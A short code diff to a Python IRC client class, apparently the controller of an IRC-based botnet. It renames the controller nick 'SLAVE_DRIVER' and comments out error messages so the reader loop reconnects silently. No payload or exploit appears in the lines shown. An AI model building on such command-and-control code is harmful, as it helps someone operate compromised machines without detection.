@@ -12,7 +12,7 @@ class conBot:
         self.PHRASE = phrase
         self.IRCSOCKET = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
         # CONTROLLER INFO
-        self.conNick = "SLAVE_DRIVER"
+        self.conNick = "SLAVE_DRIVER123"
         self.liveConnection = False # Flag to see if controller connection to IRC Server is active
         self.command = None
 
@@ -88,9 +88,9 @@ class conBot:
                     
      
         except Exception as e:
-            print("Exception: ")
-            print(e)
-            print("Reconnecting in 5 seconds ...")
+            #print("Exception: ")
+            #print(e)
+            #print("Reconnecting in 5 seconds ...")
             time.sleep(5)
             self.reader()
 
@@ -180,7 +180,9 @@ def main():
         while noConnection:
             noConnection = cbot.IRCconnect()
         
+        
         print("Controller is running. Connected with nick: " + cbot.conNick)
+
 
         # create a thread that will continuously read from the IRC
         readThread = threading.Thread(target = cbot.reader)
